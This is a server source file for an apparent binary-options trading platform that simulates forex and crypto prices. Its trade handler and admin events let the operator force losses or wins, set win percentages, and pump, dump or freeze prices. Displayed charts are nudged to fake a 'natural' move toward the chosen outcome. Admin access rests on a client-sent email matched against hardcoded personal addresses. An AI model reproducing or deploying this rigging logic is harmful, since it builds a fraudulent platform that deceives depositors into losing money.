import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import { createServer as createViteServer } from 'vite';

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  const httpServer = createServer(app);

  // Setup Socket.IO
  const io = new Server(httpServer, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST']
    }
  });

  // --- Market Simulation Engine (Server-Side) ---
  const assets: Record<string, { price: number, volatility: number, trend: number, isFrozen?: boolean, targetPrice?: number | null }> = {
    'AUD/CHF': { price: 0.5720, volatility: 0.0002, trend: 0 },
    'AUD/JPY': { price: 97.50, volatility: 0.02, trend: 0 },
    'AUD/USD': { price: 0.6550, volatility: 0.0002, trend: 0 },
    'EUR/AUD': { price: 1.6550, volatility: 0.0002, trend: 0 },
    'EUR/CAD': { price: 1.4650, volatility: 0.0002, trend: 0 },
    'EUR/GBP': { price: 0.8550, volatility: 0.0002, trend: 0 },
    'EUR/JPY': { price: 163.50, volatility: 0.02, trend: 0 },
    'EUR/USD': { price: 1.0845, volatility: 0.0002, trend: 0 },
    'GBP/AUD': { price: 1.9350, volatility: 0.0003, trend: 0 },
    'GBP/CAD': { price: 1.7150, volatility: 0.0003, trend: 0 },
    'GBP/CHF': { price: 1.1350, volatility: 0.0003, trend: 0 },
    'GBP/USD': { price: 1.2670, volatility: 0.0003, trend: 0 },
    'NZD/USD': { price: 0.6150, volatility: 0.0002, trend: 0 },
    'USD/AED': { price: 3.67, volatility: 0.001, trend: 0 },
    'USD/ARS': { price: 830.50, volatility: 1.5, trend: 0 },
    'USD/BDT': { price: 109.50, volatility: 0.5, trend: 0 },
    'USD/BRL': { price: 4.95, volatility: 0.01, trend: 0 },
    'USD/CAD': { price: 1.3550, volatility: 0.0002, trend: 0 },
    'USD/CHF': { price: 0.8850, volatility: 0.0002, trend: 0 },
    'USD/COP': { price: 3950.50, volatility: 5.0, trend: 0 },
    'USD/DZD': { price: 134.50, volatility: 0.5, trend: 0 },
    'USD/EGP': { price: 30.90, volatility: 0.1, trend: 0 },
    'USD/IDR': { price: 15600.0, volatility: 20.0, trend: 0 },
    'USD/INR': { price: 83.00, volatility: 0.1, trend: 0 },
    'USD/JPY': { price: 150.20, volatility: 0.01500, trend: 0 },
    'USD/MXN': { price: 17.05, volatility: 0.05, trend: 0 },
    'USD/PKR': { price: 279.50, volatility: 1.0, trend: 0 },
    'USD/SAR': { price: 3.75, volatility: 0.001, trend: 0 },
    'BTC/USD': { price: 51241.67, volatility: 15.5, trend: 0 },
    'ETH/USD': { price: 2950.12, volatility: 2.5, trend: 0 },
  };

  // Store historical ticks (last 60 minutes = 3600 ticks)
  const history: Record<string, any[]> = {};
  Object.keys(assets).forEach(symbol => {
    history[symbol] = [];
  });

  // Track active trades for admin panel
  const activeTrades: Record<string, any> = {};
  
  // Track connected users for admin panel
  const connectedUsers: Record<string, any> = {};

  // Global Trade Automation Settings
  let globalTradeSettings = {
    mode: 'FAIR', // 'FAIR', 'FORCE_LOSS', 'FORCE_WIN', 'PERCENTAGE'
    winPercentage: 50
  };

  // Global Support & Tutorial Settings
  let globalSupportSettings = {
    telegram: 'https://t.me/onyxtrade_support',
    whatsapp: 'https://wa.me/1234567890',
    email: 'support@onyxtrade.com'
  };

  // Referral Settings
  let globalReferralSettings = {
    bonusAmount: 10, // Fixed bonus for referrer
    referralPercentage: 5, // Percentage of first deposit
    minDepositForBonus: 20
  };

  // Deposit & Withdrawal Requests
  let pendingRequests: any[] = [];
  
  // Global Notifications
  let globalNotifications: any[] = [];

  let globalTutorials = [
    {
      id: '1',
      title: 'Binary Options Basics',
      description: 'Learn the fundamentals of digital options trading in 5 minutes.',
      link: 'https://youtube.com/watch?v=example1',
      category: 'Beginner',
      duration: '5:20'
    },
    {
      id: '2',
      title: 'Advanced Chart Analysis',
      description: 'Master technical indicators and price action strategies.',
      link: 'https://youtube.com/watch?v=example2',
      category: 'Advanced',
      duration: '12:45'
    }
  ];

  // Generate initial history
  const now = Date.now();
  Object.keys(assets).forEach(symbol => {
    const asset = assets[symbol as keyof typeof assets];
    let currentPrice = asset.price;
    let currentTrend = 0;
    
    for (let i = 14400; i >= 0; i--) {
      const time = now - i * 1000;
      currentTrend += (Math.random() - 0.5) * asset.volatility * 0.1;
      currentTrend *= 0.95;
      
      // Professional candle variety logic
      const candleTypeRand = Math.random();
      let moveMultiplier = 1.0;
      if (candleTypeRand < 0.15) moveMultiplier = 0.1; // Doji / Small body
      else if (candleTypeRand < 0.35) moveMultiplier = 1.6; // Healthy / Strong body
      
      const move = (currentTrend + (Math.random() - 0.5) * asset.volatility * 1.2) * moveMultiplier;
      currentPrice += move;
      
      const wickRand = Math.random();
      let upperWickBase = Math.random() * asset.volatility * 1.2;
      let lowerWickBase = Math.random() * asset.volatility * 1.2;
      
      if (wickRand < 0.1) { // Long shadows on both sides
        upperWickBase *= 3.5;
        lowerWickBase *= 3.5;
      } else if (wickRand < 0.2) { // Long lower shadow (Hammer)
        lowerWickBase *= 4.5;
        upperWickBase *= 0.4;
      } else if (wickRand < 0.3) { // Long upper shadow (Shooting Star)
        upperWickBase *= 4.5;
        lowerWickBase *= 0.4;
      }

      history[symbol].push({
        time,
        price: currentPrice,
        open: currentPrice - move,
        high: Math.max(currentPrice - move, currentPrice) + upperWickBase,
        low: Math.min(currentPrice - move, currentPrice) - lowerWickBase,
        close: currentPrice
      });
    }
    asset.price = currentPrice;
  });

  // Generate ticks every 200ms for smooth movement
  let tickCounter = 0;
  setInterval(() => {
    const now = Date.now();
    const ticks: Record<string, any> = {};
    const isFullSecond = tickCounter % 5 === 0;

    Object.keys(assets).forEach(symbol => {
      const asset = assets[symbol];
      
      let newPrice = asset.price;
      
      if (!asset.isFrozen) {
        if (asset.targetPrice) {
          // Move towards target price (scaled for 200ms)
          const diff = asset.targetPrice - asset.price;
          const step = diff * 0.01; // Move 1% towards target each tick (smooth)
          newPrice += step;
          
          // If close enough, clear target
          if (Math.abs(diff) < asset.volatility * 0.02) {
            asset.targetPrice = null;
          }
        } else {
          // Natural movement logic (scaled for 200ms)
          asset.trend += (Math.random() - 0.5) * asset.volatility * 0.02;
          asset.trend *= 0.99;
          
          const candleTypeRand = Math.random();
          let moveMultiplier = 1.0;
          if (candleTypeRand < 0.15) moveMultiplier = 0.15; // Doji / Small body
          else if (candleTypeRand < 0.35) moveMultiplier = 1.5; // Healthy / Strong body
          
          const move = (asset.trend + (Math.random() - 0.5) * asset.volatility * 0.24) * moveMultiplier;
          newPrice += move;
        }
      }
      
      const wickRand = Math.random();
      let upperWickBase = (asset.isFrozen ? 0 : Math.random() * asset.volatility * 1.3);
      let lowerWickBase = (asset.isFrozen ? 0 : Math.random() * asset.volatility * 1.3);
      
      if (!asset.isFrozen) {
        if (wickRand < 0.08) { // Long shadows on both sides
          upperWickBase *= 3.8;
          lowerWickBase *= 3.8;
        } else if (wickRand < 0.18) { // Long lower shadow (Hammer)
          lowerWickBase *= 4.8;
          upperWickBase *= 0.3;
        } else if (wickRand < 0.28) { // Long upper shadow (Shooting Star)
          upperWickBase *= 4.8;
          lowerWickBase *= 0.3;
        }
      }

      const tick = {
        time: now,
        price: newPrice,
        open: asset.price,
        high: Math.max(asset.price, newPrice) + upperWickBase,
        low: Math.min(asset.price, newPrice) - lowerWickBase,
        close: newPrice,
        isFrozen: asset.isFrozen
      };
      
      ticks[symbol] = tick;
      
      // Only push to history every 1 second to keep it consistent
      if (isFullSecond) {
        history[symbol].push(tick);
        // Keep up to 24 hours of history (86,400 seconds)
        if (history[symbol].length > 86400) {
          history[symbol].shift(); 
        }
      }
      
      asset.price = newPrice;
    });

    // Broadcast to all connected clients
    io.emit('market-tick', ticks);
    
    // Broadcast active trades to admin every second
    if (isFullSecond) {
      io.to('admin-room').emit('admin-active-trades', Object.values(activeTrades));
      io.to('admin-room').emit('admin-users', Object.values(connectedUsers));
    }
    
    tickCounter++;
  }, 200);

  // Handle Client Connections
  io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);
    
    // Default user state
    connectedUsers[socket.id] = {
      id: socket.id,
      email: 'Anonymous',
      name: 'Guest',
      balance: 0,
      trades: []
    };

    // Handle user authentication/sync from client
    socket.on('user-sync', (userData) => {
      if (userData && userData.email) {
        connectedUsers[socket.id] = {
          ...connectedUsers[socket.id],
          ...userData,
          id: socket.id // Keep socket ID as primary identifier for now
        };
      }
    });

    // Send initial prices
    const initialPrices: Record<string, number> = {};
    Object.keys(assets).forEach(symbol => {
      initialPrices[symbol] = assets[symbol as keyof typeof assets].price;
    });
    socket.emit('initial-prices', initialPrices);

    // Handle history request
    socket.on('request-history', (assetShortName) => {
      socket.emit('asset-history', {
        asset: assetShortName,
        data: history[assetShortName] || []
      });
    });

    // Handle Trade Execution
    socket.on('place-trade', (trade) => {
      console.log('Trade received:', trade);
      
      // Apply Global Automation Rules
      let forcedResult = undefined;
      if (globalTradeSettings.mode === 'FORCE_LOSS') {
        forcedResult = 'LOSS';
      } else if (globalTradeSettings.mode === 'FORCE_WIN') {
        forcedResult = 'WIN';
      } else if (globalTradeSettings.mode === 'PERCENTAGE') {
        const isWin = Math.random() * 100 < globalTradeSettings.winPercentage;
        forcedResult = isWin ? 'WIN' : 'LOSS';
      }

      // Store active trade
      activeTrades[trade.id] = { ...trade, socketId: socket.id, forcedResult };
      
      // In a real app, we would validate balance and store in DB here
      // For now, we just acknowledge receipt
      socket.emit('trade-accepted', { id: trade.id, status: 'ACTIVE' });

      // Set a timer to resolve the trade
      const durationMs = trade.endTime - Date.now();
      
      // If there's a forced result, manipulate the price slightly before the trade ends
      if (forcedResult) {
        // Start manipulation earlier (e.g., halfway through the trade or at least 5 seconds before end)
        const manipulationTime = Math.max(0, Math.min(durationMs / 2, durationMs - 5000));
        setTimeout(() => {
          const activeTrade = activeTrades[trade.id];
          if (!activeTrade) return;
          const assetKey = activeTrade.assetShortName || activeTrade.asset;
          const asset = assets[assetKey as keyof typeof assets];
          if (!asset) return;

          const isUp = activeTrade.type === 'UP';
          const shouldWin = forcedResult === 'WIN';
          
          // Determine if we need to move price UP or DOWN
          const needsUp = (isUp && shouldWin) || (!isUp && !shouldWin);
          
          // Calculate a safe target price
          const offset = asset.volatility * 2; // Smaller offset for natural look
          
          // If the current price is already on the wrong side, we need a bigger target to pull it across
          const currentPrice = asset.price;
          let target = activeTrade.entryPrice + (needsUp ? offset : -offset);
          
          if (needsUp && currentPrice < activeTrade.entryPrice) {
             target = activeTrade.entryPrice + Math.abs(activeTrade.entryPrice - currentPrice) + offset;
          } else if (!needsUp && currentPrice > activeTrade.entryPrice) {
             target = activeTrade.entryPrice - Math.abs(activeTrade.entryPrice - currentPrice) - offset;
          }
          
          asset.targetPrice = target;
        }, manipulationTime);
      }

      setTimeout(() => {
        const activeTrade = activeTrades[trade.id];
        if (!activeTrade) return; // Trade might have been forced by admin

        const assetKey = activeTrade.assetShortName || activeTrade.asset;
        const currentPrice = assets[assetKey as keyof typeof assets]?.price || activeTrade.entryPrice;
        
        // Check if admin forced a result
        let isWin = false;
        let finalClosePrice = currentPrice;
        
        if (activeTrade.forcedResult) {
          isWin = activeTrade.forcedResult === 'WIN';
          const isUp = activeTrade.type === 'UP';
          const needsUp = (isUp && isWin) || (!isUp && !isWin);
          
          // Ensure final close price is on the correct side
          const volatility = assets[assetKey as keyof typeof assets]?.volatility || 0.001;
          if (needsUp && finalClosePrice <= activeTrade.entryPrice) {
            finalClosePrice = activeTrade.entryPrice + volatility;
          } else if (!needsUp && finalClosePrice >= activeTrade.entryPrice) {
            finalClosePrice = activeTrade.entryPrice - volatility;
          }
          
          // Update the asset price to match the forced close price so the chart doesn't jump back
          if (assets[assetKey as keyof typeof assets]) {
             assets[assetKey as keyof typeof assets].price = finalClosePrice;
          }
        } else {
          isWin = activeTrade.type === 'UP' 
            ? currentPrice > activeTrade.entryPrice 
            : currentPrice < activeTrade.entryPrice;
        }
        
        const profit = isWin ? activeTrade.amount * (activeTrade.payout / 100) : 0;
        
        socket.emit('trade-result', {
          id: activeTrade.id,
          status: isWin ? 'WIN' : 'LOSS',
          closePrice: finalClosePrice,
          profit: profit
        });
        
        delete activeTrades[activeTrade.id];
      }, durationMs);
    });

    // --- Admin Events ---
    socket.on('admin-join', (email) => {
      const adminEmails = ['hasan@gmail.com', 'tasmeaykhatun565@gmail.com'];
      if (email && adminEmails.includes(email.toLowerCase())) {
        socket.join('admin-room');
        socket.emit('admin-assets', assets);
        socket.emit('admin-trade-settings', globalTradeSettings);
        socket.emit('admin-support-settings', globalSupportSettings);
        socket.emit('admin-tutorials', globalTutorials);
        socket.emit('admin-referral-settings', globalReferralSettings);
        socket.emit('admin-requests', pendingRequests);
        socket.emit('admin-notifications', globalNotifications);
        socket.emit('admin-users', Object.values(connectedUsers));
      }
    });

    // Send initial support settings to all users
    socket.emit('support-settings', globalSupportSettings);
    socket.emit('tutorials', globalTutorials);
    socket.emit('referral-settings', globalReferralSettings);

    socket.on('user-update', (userData) => {
      if (userData && userData.email) {
        connectedUsers[socket.id] = {
          ...userData,
          socketId: socket.id,
          lastSeen: Date.now()
        };
        io.to('admin-room').emit('admin-users', Object.values(connectedUsers));
      }
    });

    socket.on('submit-request', (request) => {
      const newRequest = {
        ...request,
        id: Math.random().toString(36).substr(2, 9),
        timestamp: Date.now(),
        status: 'PENDING'
      };
      pendingRequests.push(newRequest);
      io.to('admin-room').emit('admin-requests', pendingRequests);
      // Notify admin
      io.to('admin-room').emit('new-request-notification', newRequest);
    });

    socket.on('admin-update-request-status', ({ requestId, status, message }) => {
      const requestIndex = pendingRequests.findIndex(r => r.id === requestId);
      if (requestIndex !== -1) {
        pendingRequests[requestIndex].status = status;
        pendingRequests[requestIndex].adminMessage = message;
        
        // Notify the specific user if they are connected
        const userEmail = pendingRequests[requestIndex].userEmail;
        const userSocket = Object.values(connectedUsers).find(u => u.email === userEmail);
        if (userSocket) {
          io.to(userSocket.socketId).emit('request-status-updated', {
            requestId,
            status,
            message
          });
        }
        
        io.to('admin-room').emit('admin-requests', pendingRequests);
      }
    });

    socket.on('admin-send-notification', (notification) => {
      const newNotification = {
        ...notification,
        id: Math.random().toString(36).substr(2, 9),
        timestamp: Date.now()
      };
      globalNotifications.push(newNotification);
      io.emit('new-notification', newNotification);
      io.to('admin-room').emit('admin-notifications', globalNotifications);
    });

    socket.on('admin-update-referral-settings', (settings) => {
      globalReferralSettings = { ...globalReferralSettings, ...settings };
      io.emit('referral-settings', globalReferralSettings);
      io.to('admin-room').emit('admin-referral-settings', globalReferralSettings);
    });

    socket.on('admin-boost-user', ({ email, isBoosted }) => {
      const user = Object.values(connectedUsers).find(u => u.email === email);
      if (user) {
        user.isBoosted = isBoosted;
        io.to(user.socketId).emit('account-boosted', isBoosted);
        io.to('admin-room').emit('admin-users', Object.values(connectedUsers));
      }
    });

    socket.on('admin-update-trade-settings', (settings) => {
      globalTradeSettings = { ...globalTradeSettings, ...settings };
      io.to('admin-room').emit('admin-trade-settings', globalTradeSettings);
    });

    socket.on('admin-update-support-settings', (settings) => {
      globalSupportSettings = { ...globalSupportSettings, ...settings };
      io.emit('support-settings', globalSupportSettings);
      io.to('admin-room').emit('admin-support-settings', globalSupportSettings);
    });

    socket.on('admin-update-tutorials', (tutorials) => {
      globalTutorials = tutorials;
      io.emit('tutorials', globalTutorials);
      io.to('admin-room').emit('admin-tutorials', globalTutorials);
    });

    socket.on('admin-set-trend', ({ asset, trend }) => {
      if (assets[asset]) {
        assets[asset].trend = trend;
      }
    });

    socket.on('admin-set-volatility', ({ asset, volatility }) => {
      if (assets[asset]) {
        assets[asset].volatility = volatility;
      }
    });

    socket.on('admin-set-price', ({ asset, price }) => {
      if (assets[asset]) {
        assets[asset].price = price;
      }
    });

    socket.on('admin-set-target', ({ asset, targetPrice }) => {
      if (assets[asset]) {
        assets[asset].targetPrice = targetPrice;
      }
    });

    socket.on('admin-toggle-freeze', ({ asset, isFrozen }) => {
      if (assets[asset]) {
        assets[asset].isFrozen = isFrozen;
      }
    });

    socket.on('admin-pump-dump', ({ asset, amount }) => {
      if (assets[asset]) {
        assets[asset].price += amount;
      }
    });

    socket.on('admin-force-trade', ({ tradeId, result }) => {
      if (activeTrades[tradeId]) {
        activeTrades[tradeId].forcedResult = result; // 'WIN' or 'LOSS'
        
        // Immediately manipulate price if forced manually
        const activeTrade = activeTrades[tradeId];
        const assetKey = activeTrade.assetShortName || activeTrade.asset;
        const asset = assets[assetKey as keyof typeof assets];
        if (asset) {
          const isUp = activeTrade.type === 'UP';
          const shouldWin = result === 'WIN';
          const needsUp = (isUp && shouldWin) || (!isUp && !shouldWin);
          const offset = asset.volatility * 2;
          
          const currentPrice = asset.price;
          let target = activeTrade.entryPrice + (needsUp ? offset : -offset);
          
          if (needsUp && currentPrice < activeTrade.entryPrice) {
             target = activeTrade.entryPrice + Math.abs(activeTrade.entryPrice - currentPrice) + offset;
          } else if (!needsUp && currentPrice > activeTrade.entryPrice) {
             target = activeTrade.entryPrice - Math.abs(activeTrade.entryPrice - currentPrice) - offset;
          }
          
          asset.targetPrice = target;
        }
      }
    });

    socket.on('disconnect', () => {
      console.log('Client disconnected:', socket.id);
      delete connectedUsers[socket.id];
    });
  });

  // API Routes
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: Date.now() });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  httpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
